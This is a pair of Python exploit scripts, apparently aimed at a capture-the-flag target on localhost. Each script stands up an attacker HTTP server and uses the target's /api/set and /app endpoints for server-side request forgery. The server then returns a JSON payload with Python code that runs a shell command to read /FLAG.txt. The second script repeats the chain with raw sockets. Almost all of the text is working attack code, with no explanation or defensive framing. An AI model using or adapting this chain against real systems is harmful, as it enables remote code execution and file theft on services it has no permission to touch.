import http.server
import socketserver
import threading
import requests
import time
import socket

target_host = "127.0.0.1"
target_port = 32985
target_base = f"http://{target_host}:{target_port}"

# Payload to read FLAG.txt
payload = {"script": "__import__('os').popen('cat /FLAG.txt').read()"}

# Find an available port for our malicious server
def find_free_port():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(('0.0.0.0', 0))
        return s.getsockname()[1]

malicious_port = find_free_port()
malicious_host = "host.docker.internal"  # This allows the target to reach back to us
malicious_url = f"http://{malicious_host}:{malicious_port}/payload"

print(f"[+] Starting malicious HTTP server on port {malicious_port}")
print(f"[+] Payload URL: {malicious_url}")
print(f"[+] Payload content: {payload}")

response_data = {"received": None, "server_started": threading.Event()}

class MaliciousHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        print(f"[SERVER] {self.address_string()} - {format % args}")
    
    def do_GET(self):
        if self.path == '/payload':
            import json
            response_json = json.dumps(payload)
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Content-Length', str(len(response_json)))
            self.end_headers()
            self.wfile.write(response_json.encode())
            print(f"[+] Served payload to {self.client_address}")
        else:
            self.send_response(404)
            self.end_headers()

# Start server in background thread
def start_server():
    with socketserver.TCPServer(("0.0.0.0", malicious_port), MaliciousHandler) as httpd:
        httpd.allow_reuse_address = True
        response_data["server_started"].set()
        print(f"[+] Server listening on port {malicious_port}")
        # Handle one request then exit
        httpd.handle_request()
        print("[+] Server handled request, shutting down")

server_thread = threading.Thread(target=start_server)
server_thread.daemon = True
server_thread.start()

# Wait for server to start
response_data["server_started"].wait(timeout=5)
time.sleep(0.5)  # Small delay to ensure server is ready

print(f"\n[+] Step 1: Setting malicious URL via /api/set")
set_url = f"{target_base}/api/set?url={malicious_url}"
print(f"[+] Request: GET {set_url}")

try:
    set_response = requests.get(set_url, timeout=10)
    print(f"[+] /api/set response: Status={set_response.status_code}")
    if set_response.text:
        print(f"[+] Response body: {set_response.text}")
except Exception as e:
    print(f"[!] Error calling /api/set: {e}")

print(f"\n[+] Step 2: Triggering SSRF via /app")
app_url = f"{target_base}/app"
print(f"[+] Request: GET {app_url}")

try:
    app_response = requests.get(app_url, timeout=15)
    print(f"[+] /app response: Status={app_response.status_code}")
    print(f"[+] Response Headers: {dict(app_response.headers)}")
    print(f"\n[+] Full Response Body:\n{'='*60}")
    print(app_response.text)
    print(f"{'='*60}")
    
    # Try to extract the flag from the response
    import re
    # Look for FLAG{...} pattern
    flag_match = re.search(r'FLAG\{[^}]+\}', app_response.text)
    if flag_match:
        print(f"\n[!] FLAG FOUND: {flag_match.group(0)}")
    else:
        # Look for any unusual content that might be the flag
        print(f"\n[+] Searching for flag pattern in response...")
        # If the response contains the output of our command
        if '/FLAG.txt' in app_response.text or len(app_response.text) > 500:
            print("[+] Potential flag data found in response (check output above)")
            
except Exception as e:
    print(f"[!] Error calling /app: {e}")

print(f"\n[+] Exploit chain complete")

import socket
import select
import json
import requests
import time

# Target information
target_host = "127.0.0.1"
target_port = 32985
target_base = f"http://{target_host}:{target_port}"

# The malicious payload
payload = {"script": "__import__('os').popen('cat /FLAG.txt').read()"}

# Setup a simple socket server
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

# Bind to available port
server_socket.bind(('0.0.0.0', 0))
server_port = server_socket.getsockname()[1]
server_socket.listen(1)

# IP that target can use to reach us
# In Docker environments, host.docker.internal usually works
malicious_url = f"http://host.docker.internal:{server_port}/payload"

print(f"[+] Malicious server listening on port {server_port}")
print(f"[+] Payload URL: {malicious_url}")
print(f"[+] Payload: {json.dumps(payload)}")

# First, send the /api/set request to store our malicious URL
print(f"\n[+] Step 1: Calling /api/set to store malicious URL...")
set_url = f"{target_base}/api/set?url={malicious_url}"

try:
    response = requests.get(set_url, timeout=10)
    print(f"[+] /api/set status: {response.status_code}")
    print(f"[+] Response: {response.text[:500]}")
except Exception as e:
    print(f"[!] Error: {e}")

# Now set the server socket to non-blocking and wait for the SSRF request
server_socket.setblocking(False)

print(f"\n[+] Step 2: Triggering /app and waiting for SSRF connection...")
app_url = f"{target_base}/app"

# Send the trigger request in a non-blocking way
import urllib.request
try:
    # Send trigger without waiting for full response
    req = urllib.request.Request(app_url)
    response_started = False
    
    # Accept connection from target
    print("[+] Waiting for target to connect (SSRF)...")
    ready, _, _ = select.select([server_socket], [], [], 10)
    
    if ready:
        client_socket, client_addr = server_socket.accept()
        print(f"[+] Target connected from {client_addr}")
        
        # Read the HTTP request
        data = client_socket.recv(4096)
        print(f"[+] Received request:\n{data.decode()[:500]}")
        
        # Send the malicious JSON response
        response_body = json.dumps(payload)
        http_response = f"HTTP/1.1 200 OK\r\n"
        http_response += f"Content-Type: application/json\r\n"
        http_response += f"Content-Length: {len(response_body)}\r\n"
        http_response += f"Connection: close\r\n"
        http_response += f"\r\n"
        http_response += response_body
        
        client_socket.send(http_response.encode())
        print(f"[+] Sent malicious JSON payload")
        client_socket.close()
        
        # Now wait a moment and check the /app response
        time.sleep(1)
        
        print(f"\n[+] Step 3: Getting /app response...")
        try:
            app_response = requests.get(app_url, timeout=10)
            print(f"[+] /app status: {app_response.status_code}")
            print(f"[+] Response:\n{app_response.text}")
        except Exception as e:
            print(f"[!] Error getting /app response: {e}")
    else:
        print("[!] Timeout waiting for target connection")
        
        # Try trigger anyway
        try:
            response = requests.get(app_url, timeout=5)
            print(f"[+] /app status: {response.status_code}")
        except Exception as e:
            print(f"[!] Error: {e}")

except Exception as e:
    print(f"[!] Error: {e}")
    import traceback
    traceback.print_exc()
finally:
    server_socket.close()

